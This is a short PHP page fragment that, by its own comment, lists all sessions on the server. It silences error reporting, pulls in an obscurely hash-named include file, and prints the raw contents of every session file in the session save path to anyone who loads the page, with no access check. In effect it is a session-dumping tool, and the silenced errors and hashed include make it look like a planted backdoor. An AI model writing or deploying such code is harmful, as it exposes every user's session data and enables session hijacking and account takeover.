<u>
<?php require 'headerTab.php'; // clean
 require_once 'ce20f9df545a3b29e662491bc81833f0.inc'; // ce20f9df545a3b29e662491bc81833f0
 error_reporting(0);
 ?>
<?php
// This code list all sessions and value in server
$files = scandir(session_save_path());
foreach ($files as $file){
  echo  "<li>". $file .":==> ".  file_get_contents( session_save_path() ."\\" . $file) ."<li>";
}
?>

</u>
